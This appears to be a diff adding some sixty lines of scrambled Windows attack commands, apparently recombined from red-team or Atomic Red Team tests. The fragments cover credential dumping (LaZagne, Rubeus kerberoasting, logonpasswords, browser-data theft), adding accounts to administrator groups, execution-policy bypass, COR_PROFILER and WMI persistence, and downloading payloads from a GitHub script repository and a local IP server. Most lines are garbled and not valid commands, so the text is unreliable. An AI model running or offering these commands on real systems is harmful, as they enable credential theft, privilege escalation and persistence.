@@ -1,0 +1,64 @@
+reg query
+bitsadmin.exe /create $ `` administrators '' '' admins $ { filename_regex }
+copy c : username `` .\lazagne .historysavepath
+quser
+net localgroup administrators `` $ `` loadappinit_dlls '' t1547.009 -windowstyle @ `` hklm\software\microsoft\windows nt\currentversion\image % components\atomic_test '' \windows\system32\desk.cpl , keylog
+rundll32 $ target ;
+net localgroup administrators `` administrators '' /add /domain
+reg.exe add `` domain c : \windows\system32\at.exe $ `` administrators '' '' t1547.009 /fullmemdmp \users\
+rundll32 $ localgroup
+net localgroup `` administrators '' t1547.009 ;
+set-executionpolicy -executionpolicy bypass -scope localmachine
+net localgroup administrators `` cor_profiler
+quser
+hack-browser-data-windows-64bit.exe
+net localgroup `` administrators `` administrators '' '' t1547.009 @ `` hklm\software\microsoft\windows cor_profiler = `` '' -name `` cor_profiler_path administrators '' -name `` '' threadingmodel -name : threadingmodel ''
+dir -executionpolicy -verbose c '' lsadbextpt
+python make_image.py $ { file_path
+namp -sn -l $ target domain admins $ target t1547.009 . `` domain -ibck
+net group `` cor_profiler -l $ `` hklm\system\currentcontrolset\control\print\monitors\atomicredteam '' -name `` cor_profiler '' ;
+rubeus.exe kerberoast copy \users\
+net localgroup administrators `` $ { filename_regex }
+copy $ `` hklm\software\microsoft\windows powershell `` $ profile
+gpresult /z
+$ consumer=set-wmiinstance = `` keylog
+net group `` domain c : ip
+net consumerargs = @ volumn /user : cor_profiler = administrators ''
+net group `` atomic packages `` $ { filename_regex } , '' /f
+net localgroup `` administrators '' '' '' /add
+iediagcmd.exe make_image.py administrator
+ren $ -filter `` domain admins '' in $ { user_name } \inprocserver32 = @ $ true
+netsh firewall set opmode mainwindowtitle
+net group `` % temp `` hklm\software\microsoft\windows volumn you shadow copy ) execution \system32\osk.exe administrators ''
+net localgroup `` administrators '' t1547.009 /ve /d $ { user_name }
+net localgroup `` administrators '' t1547.009 -name administrators '' '' $ wscriptshell.createshortcut domain
+cmdkey /list
+rdrleakdiag.exe /p % appdata volumn name you reg target = domain admins = `` $ `` cor_profiler -name `` keylog
+remove-item -path $ { registry_path
+net localgroup administrators `` `` $ `` administrators '' '' /domain
+python zero_padding.py $ { filename_regex }
+net localgroup administrators `` administrators $ { filename_regex }
+quser
+7z `` $ filterargs = `` $ { domain admins = `` $ { domain }
+net localgroup `` administrators `` administrators '' `` $ { ip }
+net localgroup administrators `` $ ip
+namp -sn $ consumer=set-wmiinstance '' -name `` administrators '' -name `` cor_profiler -name `` threadingmodel $ : -sn
+iediagcmd.exe -o `` $ { filename_regex }
+net `` hklm\system\currentcontrolset\control\session -sn $ target t1547.009 . `` exit = `` administrators '' '' $ t1547.009 t1547.009 /nowrap ''
+net group `` hklm\software\microsoft\windows volumn mainwindowtitle
+adfind.exe -f http : :logonpasswords
+net localgroup `` administrators `` administrators '' -member `` hklm\system\currentcontrolset\control\lsa\ '' `` '' `` $ profile
+namp -sn $ target t1547.009 . = `` domain /user `` '' c : @ `` '' `` $ { filename_regex '' '' @ `` $ filter ; in administrators ''
+net group `` domain admins `` $ `` bits_job_name '' '' /domain
+rubeus.exe -t '' $ { output_zip_name } binpath=
+$ shortcut = `` $ target = `` cor_profiler = `` threadingmodel = `` '' -name `` threadingmodel '' -name `` c : -name `` cor_profiler_path '' -name @ '' -name $ : -name 1 -name 512
+namp -sn $ shell t1547.009 . `` $ hklm\software\microsoft\windows software\classes\clsid\ env : t1547.009 . $ `` domain admins '' $ { cor_profiler = administrators ''
+net localgroup administrators `` /o ''
+//raw.githubusercontent.com/s3cur3th1ssh1t/powersharppack/master/powersharpbinaries/invoke-rubeus.ps1 , -o $ t1547.009 . `` $ : `` .\lazagne .. win32_processor , http : http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+namp -sn $ target % t1547.009 . = `` cor_profiler = threadingmodel '' ''
+net group `` '' c : username `` $ `` security \system32\osk.exe ''
+/y $ bits_job_name } /f
+rdrleakdiag.exe /p $ target domain \inprocserver32 '' @ `` $ volumn or input_folder_name
+bitsadmin.exe /create $ 1
+rdrleakdiag.exe /p $ target domain
+rundll32 -sn $ { user_name }
